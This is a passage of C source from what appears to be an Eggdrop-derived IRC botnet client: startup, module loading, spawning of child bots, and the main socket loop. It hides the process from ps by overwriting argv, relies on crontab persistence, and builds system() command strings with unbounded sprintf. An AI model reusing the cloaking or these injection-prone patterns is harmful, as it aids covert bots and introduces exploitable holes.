		      snprintf (myip, 121, "%s", ip);
#ifdef LEAF
		    }
#endif
		  snprintf (origbotname, 10, "%s", nick);
#ifdef HUB
		  sprintf (userfile, "%s/.%s.user", confdir, nick);
#endif
		  if (host[0])
		    {
#ifdef LEAF
		      if (host[0] == '+')
			{
			  host++;
			  sprintf (hostname6, "%s", host);
			}
		      else
#endif
			sprintf (hostname, "%s", host);
		    }
		}
#ifdef LEAF
	      else
		{
		  char buf2[DIRMAX];
		  xx = 0, x = 0, errno = 0;
		  s[0] = '\0';
		  egg_snprintf (buf2, sizeof buf2, "%s/.pid.%s", tempdir,
				nick);
		  fp = fopen (buf2, "r");
		  if (fp != NULL)
		    {
		      fgets (s, 10, fp);
		      fclose (fp);
		      xx = atoi (s);
		      if (updating)
			{
			  x = kill (xx, SIGKILL);
			  unlink (buf2);
			}
		      kill (xx, SIGCHLD);
		      if (errno == ESRCH || (updating && !x))
			{
			  sprintf (buf2, "%s -l %s -i %s %s %s", binname,
				   nick, ip, host[0] ? "-H" : "",
				   host[0] ? host : "");
			  if (system (buf2))
			    printf ("* Failed to spawn %s\n", nick);
			}
		    }
		  else
		    {
		      sprintf (buf2, "%s -l %s -i %s -H %s", binname, nick,
			       ip, host);
		      if (system (buf2))
			printf ("* Failed to spawn %s\n", nick);
		    }
		}
#endif
	    }
	  temps = 0;
	}
      fclose (f);
#ifdef LEAF
      if (updating)
	exit (0);
    }
#endif
#ifdef LEAF
#ifdef S_PSCLOAK
  on = 0;
  strncpy (argv[0], progname (), strlen (argv[0]));
  for (on = 1; on < argc; on++)
    memset (argv[on], 0, strlen (argv[on]));
#endif
#endif
  module_load ("dns");
  module_load ("channels");
#ifdef LEAF
  module_load ("server");
  module_load ("irc");
#endif
  module_load ("transfer");
  module_load ("share");
  module_load ("update");
  module_load ("notes");
  module_load ("console");
  module_load ("ctcp");
  module_load ("compress");
  chanprog ();
#ifdef LEAF
  if (localhub)
#endif
    check_crontab ();
  Context;
  if (!encrypt_pass)
    {
      printf (MOD_NOCRYPT);
      bg_send_quit (BG_ABORT);
      exit (1);
    }
  cache_miss = 0;
  cache_hit = 0;
  if (!pid_file[0])
    egg_snprintf (pid_file, sizeof pid_file, "%s.pid.%s", tempdir,
		  botnetnick);
  f = fopen (pid_file, "r");
  if ((localhub && !updating) || !localhub)
    {
      if (f != NULL)
	{
	  fgets (s, 10, f);
	  xx = atoi (s);
	  kill (xx, SIGCHLD);
	  if (errno != ESRCH)
	    {
	      bg_send_quit (BG_ABORT);
	      exit (1);
	    }
	}
    }
#ifdef HUB
  Context;
  Context;
#endif
  i = 0;
  for (chan = chanset; chan; chan = chan->next)
    i++;
  putlog (LOG_MISC, "*", "=== %s: %d channels, %d users.", botnetnick, i,
	  count_users (userlist));
  if (backgrd)
    {
#ifndef CYGWIN_HACKS
      bg_do_split ();
    }
  else
    {
#endif
      xx = getpid ();
      if (xx != 0)
	{
	  FILE *fp;
	  unlink (pid_file);
	  fp = fopen (pid_file, "w");
	  if (fp != NULL)
	    {
	      fprintf (fp, "%u\n", xx);
	      if (fflush (fp))
		{
		  printf (EGG_NOWRITE, pid_file);
		  fclose (fp);
		  unlink (pid_file);
		}
	      else
		fclose (fp);
	    }
	  else
	    printf (EGG_NOWRITE, pid_file);
#ifdef CYGWIN_HACKS
	  printf ("Launched into the background  (pid: %d)\n\n", xx);
#endif
	}
    }
  use_stderr = 0;
  if (backgrd)
    {
#if HAVE_SETPGID && !defined(CYGWIN_HACKS)
      setpgid (0, 0);
#endif
      freopen ("/dev/null", "r", stdin);
      freopen ("/dev/null", "w", stdout);
      freopen ("/dev/null", "w", stderr);
#ifdef CYGWIN_HACKS
      FreeConsole ();
#endif
    }
  if (!backgrd && term_z)
    {
      int n = new_dcc (&DCC_CHAT, sizeof (struct chat_info));
      dcc[n].addr = iptolong (getmyip ());
      dcc[n].sock = STDOUT;
      dcc[n].timeval = now;
      dcc[n].u.chat->con_flags = conmask;
      dcc[n].u.chat->strip_flags = STRIP_ALL;
      dcc[n].status = STAT_ECHO;
      strcpy (dcc[n].nick, "HQ");
      strcpy (dcc[n].host, "llama@console");
      dcc[n].user = get_user_by_handle (userlist, "HQ");
      if (!dcc[n].user)
	{
	  userlist =
	    adduser (userlist, "HQ", "none", "-",
		     USER_OP | USER_PARTY | USER_CHUBA | USER_HUBA);
	  dcc[n].user = get_user_by_handle (userlist, "HQ");
	}
      setsock (STDOUT, 0, AF_INET);
      dprintf (n, "\n### ENTERING DCC CHAT SIMULATION ###\n\n");
      dcc_chatter (n);
    }
  then = now;
  online_since = now;
  autolink_cycle (NULL);
  add_hook (HOOK_SECONDLY, (Function) core_secondly);
  add_hook (HOOK_10SECONDLY, (Function) core_10secondly);
  add_hook (HOOK_MINUTELY, (Function) core_minutely);
  add_hook (HOOK_HOURLY, (Function) core_hourly);
  add_hook (HOOK_REHASH, (Function) event_rehash);
  add_hook (HOOK_PRE_REHASH, (Function) event_prerehash);
  add_hook (HOOK_USERFILE, (Function) event_save);
#ifdef HUB
  add_hook (HOOK_BACKUP, (Function) backup_userfile);
#endif
  add_hook (HOOK_DAILY, (Function) event_logfile);
  add_hook (HOOK_DAILY, (Function) event_resettraffic);
  add_hook (HOOK_LOADED, (Function) event_loaded);
  call_hook (HOOK_LOADED);
  debug0 ("main: entering loop");
  while (1)
    {
      int socket_cleanup = 0;
#if !defined(HAVE_PRE7_5_TCL)
      Tcl_DoOneEvent (TCL_ALL_EVENTS | TCL_DONT_WAIT);
#endif
      now = time (NULL);
      random ();
      if (now != then)
	{
	  call_hook (HOOK_SECONDLY);
	  then = now;
	}
      if (!socket_cleanup)
	{
	  socket_cleanup = 5;
	  dcc_remove_lost ();
	  dequeue_sockets ();
	}
      else
	socket_cleanup--;
      garbage_collect ();
      xx = sockgets (buf, &i);
      if (xx >= 0)
	{
	  int idx;
	  for (idx = 0; idx < dcc_total; idx++)
	    if (dcc[idx].sock == xx)
	      {
		if (dcc[idx].type && dcc[idx].type->activity)
		  {
		    if (dcc[idx].type->name)
		      {
			if (!strncmp (dcc[idx].type->name, "BOT", 3))
			  itraffic_bn_today += strlen (buf) + 1;
			else if (!strcmp (dcc[idx].type->name, "SERVER"))
			  itraffic_irc_today += strlen (buf) + 1;
			else if (!strncmp (dcc[idx].type->name, "CHAT", 4))
			  itraffic_dcc_today += strlen (buf) + 1;
			else if (!strncmp (dcc[idx].type->name, "FILES", 5))
			  itraffic_dcc_today += strlen (buf) + 1;
			else if (!strcmp (dcc[idx].type->name, "SEND"))
			  itraffic_trans_today += strlen (buf) + 1;
			else if (!strncmp (dcc[idx].type->name, "GET", 3))
			  itraffic_trans_today += strlen (buf) + 1;
			else
			  itraffic_unknown_today += strlen (buf) + 1;
		      }
		    dcc[idx].type->activity (idx, buf, i);
		  }
		else
		  putlog (LOG_MISC, "*",
			  "!!! untrapped dcc activity: type %s, sock %d",
			  dcc[idx].type->name, dcc[idx].sock);
		break;
	      }
	}
      else if (xx == -1)
	{
	  int idx;
	  if (i == STDOUT && !backgrd)
	    fatal ("END OF FILE ON TERMINAL", 0);
	  for (idx = 0; idx < dcc_total; idx++)
	    if (dcc[idx].sock == i)
	      {
		if (dcc[idx].type && dcc[idx].type->eof)
		  dcc[idx].type->eof (idx);
		else
		  {
		    putlog (LOG_MISC, "*",
			    "*** ATTENTION: DEAD SOCKET (%d) OF TYPE %s UNTRAPPED",
			    i,
			    dcc[idx].type ? dcc[idx].type->
			    name : "*UNKNOWN*");
		    killsock (i);
		    lostdcc (idx);
		  }
		idx = dcc_total + 1;
	      }
	  if (idx == dcc_total)
	    {
	      putlog (LOG_MISC, "*",
		      "(@) EOF socket %d, not a dcc socket, not anything.",
		      i);
	      close (i);
	      killsock (i);
	    }
	}
      else if (xx == -2 && errno != EINTR)
	{
	  putlog (LOG_MISC, "*", "* Socket error #%d; recovering.", errno);
	  for (i = 0; i < dcc_total; i++)
	    {
	      if ((fcntl (dcc[i].sock, F_GETFD, 0) == -1) && (errno = EBADF))
		{
		  putlog (LOG_MISC, "*",
			  "DCC socket %d (type %d, name '%s') expired -- pfft",
			  dcc[i].sock, dcc[i].type, dcc[i].nick);
		  killsock (dcc[i].sock);
		  lostdcc (i);
		  i--;
		}
	    }
	}
      else if (xx == -3)
	{
	  call_hook (HOOK_IDLE);
	  socket_cleanup = 0;
	}
      if (do_restart)
	{
	  if (do_restart == -2)
	    rehash ();
	  else
	    {
	      int f = 1;
	      module_entry *p;
	      Function x;
	      char xx[256];
	      check_tcl_event ("prerestart");
	      while (f)
		{
		  f = 0;
		  for (p = module_list; p != NULL; p = p->next)
		    {
		      dependancy *d = dependancy_list;
		      int ok = 1;
		      while (ok && d)
			{
			  if (d->needed == p)
			    ok = 0;
			  d = d->next;
			}
		      if (ok)
			{
			  strcpy (xx, p->name);
			  if (module_unload (xx, botnetnick) == NULL)
			    {
			      f = 1;
			      break;
			    }
			}
		    }
		}
	      for (f = 0, p = module_list; p; p = p->next)
		{
		  if (!strcmp (p->name, "eggdrop")
		      || !strcmp (p->name, "encryption")
		      || !strcmp (p->name, "uptime"))
		    f = 0;
		  else
		    f = 1;
		}
	      if (f)
		putlog (LOG_MISC, "*", MOD_STAGNANT);
	      flushlogs ();
	      kill_tcl ();
	      init_tcl (argc, argv);
	      init_language (0);
	      for (p = module_list; p; p = p->next)
		{
		  if (p->funcs)
		    {
		      x = p->funcs[MODCALL_START];
		      x (NULL);
		    }
		}
	      rehash ();
	      restart_chons ();
	      call_hook (HOOK_LOADED);
	    }
	  do_restart = 0;
	}
    }
}
